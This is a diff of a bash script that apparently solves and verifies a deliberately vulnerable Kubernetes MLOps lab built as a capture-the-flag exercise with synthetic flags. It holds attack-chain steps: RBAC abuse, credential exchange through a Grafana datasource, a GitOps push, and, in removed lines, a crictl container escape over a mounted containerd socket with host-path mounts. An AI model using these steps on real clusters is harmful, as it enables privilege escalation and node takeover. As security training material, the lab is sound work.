@@ -3,8 +3,6 @@ set -euo pipefail
 
 SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
 ROOT_DIR="$(cd -- "${SCRIPT_DIR}/../.." && pwd)"
-STAGE2_JOB="${ROOT_DIR}/lab/stages/stage-02-rbac/attack-job.yaml"
-STAGE3_CLIENT="${ROOT_DIR}/lab/stages/stage-03-monitoring/attack-client.yaml"
 STAGE5_BASE="${ROOT_DIR}/lab/stages/stage-05-runtime/runtime-builder-base.yaml"
 STAGE5_DESIRED="${ROOT_DIR}/lab/stages/stage-05-runtime/repository/runtime-builder/deployment.yaml"
 
@@ -136,14 +134,39 @@ wait_for_argo_revision() {
   exit 1
 }
 
+wait_for_participant_argo_revision() {
+  local expected_revision="$1"
+  local attempt payload sync health revision
+
+  for attempt in $(seq 1 120); do
+    payload="$(curl -fsS "${foothold_url}/stage-04/application")"
+    sync="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
+      'import json, sys; print(json.load(sys.stdin)["sync"])')"
+    health="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
+      'import json, sys; print(json.load(sys.stdin)["health"])')"
+    revision="$(printf '%s' "$payload" | "$POC_PYTHON" -c \
+      'import json, sys; print(json.load(sys.stdin)["revision"])')"
+    if [[ "$sync" == "Synced" && "$health" == "Healthy" && "$revision" == "$expected_revision" ]]; then
+      printf '%s' "$payload"
+      return
+    fi
+    sleep 5
+  done
+  printf 'ERROR: participant API did not observe Argo CD revision %s.\n' "$expected_revision" >&2
+  exit 1
+}
+
 printf '\n[Stage 1] synthetic SSRF and marker-only RCE\n'
 start_port_forward modelgate-lab service/modelgate 80
 modelgate_url="http://127.0.0.1:$(forwarded_port)"
 POC_MODELGATE_URL="$modelgate_url" POC_CANARY_TARGET=eks \
   "$POC_PYTHON" "${ROOT_DIR}/poc/ssrf_canary.py"
-POC_MODELGATE_URL="$modelgate_url" \
-  "$POC_PYTHON" "${ROOT_DIR}/poc/rce_marker.py" --timeout 120
-stop_port_forward
+rce_result="$(POC_MODELGATE_URL="$modelgate_url" \
+  "$POC_PYTHON" "${ROOT_DIR}/poc/rce_marker.py" --timeout 120)"
+printf '%s\n' "$rce_result"
+foothold_session="$(printf '%s' "$rce_result" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["foothold_session"])')"
+foothold_url="${modelgate_url}/api/lab/footholds/${foothold_session}"
 
 printf '\n[Stage 2] modelgate ServiceAccount to monitoring-runner\n'
 if kubectl -n stage-02-rbac get secret/stage-02-flag \
@@ -151,40 +174,62 @@ if kubectl -n stage-02-rbac get secret/stage-02-flag \
   printf 'ERROR: modelgate directly read the Stage 2 Secret.\n' >&2
   exit 1
 fi
-kubectl apply --as="$MODELGATE_USER" -f "$STAGE2_JOB"
-kubectl -n stage-02-rbac wait --for=condition=complete \
-  job/stage-02-secret-reader --timeout=5m
-stage2_pod="$(kubectl -n stage-02-rbac get pod --as="$MODELGATE_USER" \
-  -l job-name=stage-02-secret-reader -o jsonpath='{.items[0].metadata.name}')"
-stage2_flag="$(kubectl -n stage-02-rbac logs --as="$MODELGATE_USER" "$stage2_pod" | base64 --decode)"
+
+stage2_rules="$(curl -fsS "${foothold_url}/self-rules")"
+printf '%s' "$stage2_rules" | "$POC_PYTHON" -c '
+import json, sys
+rules = json.load(sys.stdin)["resource_rules"]
+if not any("create" in rule.get("verbs", []) and
+           "jobs" in rule.get("resources", []) for rule in rules):
+    raise SystemExit("ERROR: fixed Job permission was not discovered")
+'
+
+curl -fsS -X POST "${foothold_url}/stage-02/job" >/dev/null
+for _ in $(seq 1 60); do
+  stage2_status="$(curl -fsS "${foothold_url}/stage-02/job")"
+  if printf '%s' "$stage2_status" | "$POC_PYTHON" -c \
+      'import json, sys; raise SystemExit(json.load(sys.stdin)["succeeded"] < 1)'
+  then
+    break
+  fi
+  sleep 2
+done
+
+stage2_log="$(curl -fsS "${foothold_url}/stage-02/log")"
+stage2_encoded="$(printf '%s' "$stage2_log" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["encoded_proof"])')"
+stage2_flag="$(printf '%s' "$stage2_encoded" | base64 --decode)"
 test "$stage2_flag" = 'FLAG{stage_2_rbac_chaining_placeholder}'
-printf 'PASS: Stage 2 fixed Job returned the synthetic flag.\n'
+printf 'PASS: RCE foothold relay submitted the fixed Stage 2 Job and returned the synthetic flag.\n'
 
 printf '\n[Stage 3] Grafana datasource to credential broker\n'
-kubectl apply -f "$STAGE3_CLIENT"
-kubectl -n stage-02-rbac wait --for=condition=Ready pod/stage-03-client --timeout=3m
-sleep 12
-stage3_query="$(kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
-  'http://grafana.stage-03-monitoring.svc:3000/api/datasources/proxy/uid/stage3-prometheus/api/v1/query?query=gitops_debug_info')"
-grep -q 'stage3-lab-repo-writer' <<<"$stage3_query"
+stage3_datasources="$(curl -fsS "${foothold_url}/stage-03/datasources")"
+grep -q 'stage3-prometheus' <<<"$stage3_datasources"
+stage3_query="$(curl -fsS "${foothold_url}/stage-03/query")"
+stage3_ref="$(printf '%s' "$stage3_query" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["credential_ref"])')"
+test "$stage3_ref" = 'stage3-lab-repo-writer'
 grep -q 'runtime-builder' <<<"$stage3_query"
-stage3_proof="$(kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
-  'http://credential-broker.stage-03-monitoring.svc:8080/exchange/stage3-lab-repo-writer')"
+stage3_proof="$(curl -fsS \
+  "${foothold_url}/stage-03/exchange/${stage3_ref}")"
 grep -q 'FLAG{stage_3_monitoring_trust_placeholder}' <<<"$stage3_proof"
 grep -q 'SYNTHETIC_STAGE3_GIT_TOKEN' <<<"$stage3_proof"
-if kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
-    --connect-timeout 5 --max-time 8 \
-    'http://prometheus.stage-03-monitoring.svc:9090/api/v1/query?query=gitops_debug_info' \
-    >/dev/null 2>&1; then
-  printf 'ERROR: direct Prometheus shortcut succeeded.\n' >&2
+stage3_user="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["username"])')"
+stage3_token="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["token"])')"
+stage4_gateway="$(printf '%s' "$stage3_proof" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["git_gateway"])')"
+arbitrary_status="$(curl -sS -o /dev/null -w '%{http_code}' \
+  "${foothold_url}/stage-03/exchange/arbitrary-reference")"
+if [[ "$arbitrary_status" != "404" ]]; then
+  printf 'ERROR: arbitrary Stage 3 credential reference was accepted.\n' >&2
   exit 1
 fi
-printf 'PASS: Stage 3 discovery/exchange succeeded and direct Prometheus was denied.\n'
+printf 'PASS: Stage 3 datasource discovery/exchange succeeded and arbitrary reference was denied.\n'
 
 printf '\n[Stage 4] restricted Git change to Argo reconciliation\n'
-start_port_forward stage-04-gitops service/gitea 3000
-gitea_port="$(forwarded_port)"
-git_url="http://${GITEA_USER}:${GITEA_TOKEN}@127.0.0.1:${gitea_port}/${GITEA_USER}/${GITEA_REPOSITORY}.git"
+git_url="http://${stage3_user}:${stage3_token}@127.0.0.1:$(forwarded_port)${stage4_gateway}"
 git clone --quiet --branch "$GIT_BRANCH" --single-branch "$git_url" "$GIT_REPOSITORY_DIR"
 git -C "$GIT_REPOSITORY_DIR" config user.name "$GITEA_USER"
 git -C "$GIT_REPOSITORY_DIR" config user.email lab@example.invalid
@@ -200,73 +245,30 @@ git -C "$GIT_REPOSITORY_DIR" reset --hard "origin/${GIT_BRANCH}" >/dev/null
 
 stage5_revision="$(push_git_manifest "$STAGE5_DESIRED" 'exercise Stage 4 and Stage 5 path')"
 RESTORE_GIT_BASELINE=true
-stop_port_forward
-wait_for_argo_revision "$stage5_revision"
-kubectl -n stage-05-runtime rollout status deployment/runtime-builder --timeout=5m
-stage4_proof="$(kubectl -n stage-05-runtime get deployment/runtime-builder \
-  -o jsonpath='{.spec.template.metadata.annotations.lab\.vuln-mlops/stage-04-proof}')"
-stage5_mode="$(kubectl -n stage-05-runtime get deployment/runtime-builder \
-  -o jsonpath='{.spec.template.spec.containers[0].env[?(@.name=="STAGE5_MODE")].value}')"
+stage4_status="$(wait_for_participant_argo_revision "$stage5_revision")"
+stage4_proof="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["stage4_proof"])')"
+stage5_mode="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["stage5_mode"])')"
 test "$stage4_proof" = 'FLAG{stage_4_gitops_placeholder}'
 test "$stage5_mode" = 'runtime-socket'
 printf 'PASS: Stage 4 commit %s reconciled through Argo CD.\n' "$stage5_revision"
+stop_port_forward
 
 printf '\n[Stage 5] runtime socket to synthetic node proof\n'
-stage5_pod="$(kubectl -n stage-05-runtime get pod -l app=runtime-builder -o json | \
-  "$POC_PYTHON" -c '
-import json, sys
+runtime_relay="$(printf '%s' "$stage4_status" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["runtime_relay"])')"
+test "$runtime_relay" = "/api/lab/footholds/${foothold_session}/stage-05/runtime/proof"
 
-pods = [
-    pod
-    for pod in json.load(sys.stdin)["items"]
-    if not pod["metadata"].get("deletionTimestamp")
-    and any(
-        status.get("ready")
-        for status in pod.get("status", {}).get("containerStatuses", [])
-    )
-]
-if not pods:
-    raise SystemExit("no current Ready runtime-builder Pod was found")
-pods.sort(key=lambda pod: pod["metadata"]["creationTimestamp"])
-print(pods[-1]["metadata"]["name"])
-')"
-stage5_uid="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.metadata.uid}')"
-stage5_node="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.spec.nodeName}')"
-node_role="$(kubectl get node "$stage5_node" -o jsonpath='{.metadata.labels.lab\.vuln-mlops/node-role}')"
-test "$node_role" = escape
-kubectl exec -n stage-05-runtime "$stage5_pod" -- test -S /run/stage5/containerd.sock
+body_status="$(curl -sS -o /dev/null -w '%{http_code}' \
+  -X POST -H 'Content-Type: application/json' -d '{}' \
+  "${modelgate_url}${runtime_relay}")"
+test "$body_status" = 400
 
-runtime_image="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.spec.containers[0].image}')"
-pod_config="{\"metadata\":{\"name\":\"${stage5_pod}\",\"namespace\":\"stage-05-runtime\",\"uid\":\"${stage5_uid}\",\"attempt\":0},\"log_directory\":\"/tmp\",\"linux\":{\"cgroup_parent\":\"system.slice\"}}"
-container_config="{\"metadata\":{\"name\":\"stage5-proof\",\"attempt\":1},\"image\":{\"image\":\"${runtime_image}\"},\"command\":[\"sh\",\"-c\",\"cp /proof/stage-05-proof /out/stage5-proof\"],\"log_path\":\"stage5-proof.log\",\"mounts\":[{\"container_path\":\"/proof\",\"host_path\":\"/var/lib/vuln-mlops\",\"readonly\":true},{\"container_path\":\"/out\",\"host_path\":\"/var/lib/kubelet/pods/${stage5_uid}/volumes/kubernetes.io~empty-dir/tmp\",\"readonly\":false}],\"linux\":{\"security_context\":{\"privileged\":false}}}"
-pod_config_b64="$(printf '%s' "$pod_config" | base64 | tr -d '\r\n')"
-container_config_b64="$(printf '%s' "$container_config" | base64 | tr -d '\r\n')"
-kubectl exec -n stage-05-runtime "$stage5_pod" -- sh -ceu \
-  'printf "%s" "$1" | base64 -d > /tmp/stage5-pod.json; printf "%s" "$2" | base64 -d > /tmp/stage5-container.json' \
-  sh "$pod_config_b64" "$container_config_b64"
-
-cri_args=(
-  --runtime-endpoint=unix:///run/stage5/containerd.sock
-  --image-endpoint=unix:///run/stage5/containerd.sock
-  --timeout=120s
-)
-sandbox_id="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
-  crictl "${cri_args[@]}" pods --name "$stage5_pod" --quiet | head -n 1)"
-test -n "$sandbox_id"
-container_id="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
-  crictl "${cri_args[@]}" create "$sandbox_id" /tmp/stage5-container.json /tmp/stage5-pod.json)"
-test -n "$container_id"
-kubectl exec -n stage-05-runtime "$stage5_pod" -- \
-  crictl "${cri_args[@]}" start "$container_id" >/dev/null
-for _ in $(seq 1 50); do
-  stage5_proof="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
-    sh -c 'cat /tmp/stage5-proof 2>/dev/null || true')"
-  [[ "$stage5_proof" == 'FLAG{stage_5_node_placeholder}' ]] && break
-  sleep 0.1
-done
-test "${stage5_proof:-}" = 'FLAG{stage_5_node_placeholder}'
-kubectl exec -n stage-05-runtime "$stage5_pod" -- \
-  crictl "${cri_args[@]}" rm "$container_id" >/dev/null 2>&1 || true
+stage5_result="$(curl -fsS -X POST "${modelgate_url}${runtime_relay}")"
+stage5_proof="$(printf '%s' "$stage5_result" | "$POC_PYTHON" -c \
+  'import json, sys; print(json.load(sys.stdin)["flag"])')"
+test "$stage5_proof" = 'FLAG{stage_5_node_placeholder}'
 
 if [[ "$(kubectl auth can-i create deployments.apps --as="$ARGO_USER" -n stage-05-runtime)" != no ]]; then
   printf 'ERROR: Argo controller can create deployments.\n' >&2
@@ -278,7 +280,7 @@ if kubectl -n stage-05-runtime patch deployment/runtime-builder --type=json \
   printf 'ERROR: Stage 5 node shortcut was accepted.\n' >&2
   exit 1
 fi
-printf 'PASS: Stage 5 CRI proof reached only the escape-node proof channel.\n'
+printf 'PASS: proof-bound runtime relay reached only the synthetic escape-node proof channel.\n'
 
 printf '\n[Cleanup] restore reviewed baseline\n'
 start_port_forward stage-04-gitops service/gitea 3000
